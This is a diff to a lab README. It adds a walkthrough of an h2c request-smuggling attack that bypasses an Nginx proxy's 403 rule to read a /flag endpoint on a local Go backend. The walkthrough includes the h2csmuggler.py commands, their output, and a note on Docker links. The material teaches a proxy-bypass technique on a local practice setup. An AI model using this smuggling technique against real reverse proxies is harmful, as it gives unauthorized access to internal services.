@@ -353,8 +353,40 @@ Grab a beer... :)
 Once the containers are started we should have the following:
 - Ngnix (proxy) on https://localhost:8443
 - Backend GO server on http://localhost:8080
-For the sake of learninf, of course, you should interact with the backend only through the proxy.
+For the sake of learninf, of course, you should interact with the backend only through the proxy. If you try to access the flag through the proxy:
 
+      https://localhost:8443/flag
+
+You will recive:
+
+        403 Forbidden
+        nginx/1.27.0
+
+First we can test if the proxy can be used as HTTP tunnell:
+
+    python h2csmuggler.py -x https://localhost:8443 --test                    
+        [INFO] h2c stream established successfully.
+        [INFO] Success! https://localhost:8443 can be used for tunneling
+Then we can proceed to try to get the flag:
+
+    python h2csmuggler.py -x https://localhost:8443 http://backend/flag
+    [INFO] h2c stream established successfully.
+    :status: 200
+    content-type: text/plain; charset=utf-8
+    content-length: 70
+    date: Sat, 08 Jun 2024 12:32:46 GMT
+    
+    Hello from the backend GO server, /, http: true. Can you get the flag?
+    
+    [INFO] Requesting - /flag
+    :status: 200
+    content-type: text/plain; charset=utf-8
+    content-length: 17
+    date: Sat, 08 Jun 2024 12:32:56 GMT
+    
+    You got the flag!
+#### Note about Docker links
+As you can see from the above command, you will notice that we requires the flag on backend host (http://backend/flag) endpoint. If you don't know docker this could be confusing, due to the docker containers configuration (have a look at the docker-compose configuration file), where a link is defined for ngnix to the go server as backend, furthermore the ngnix configuration proxy pass point to http://backend. More information about Docker links can be found [here](https://docs.docker.com/compose/networking/#link-containers)
 
 
 
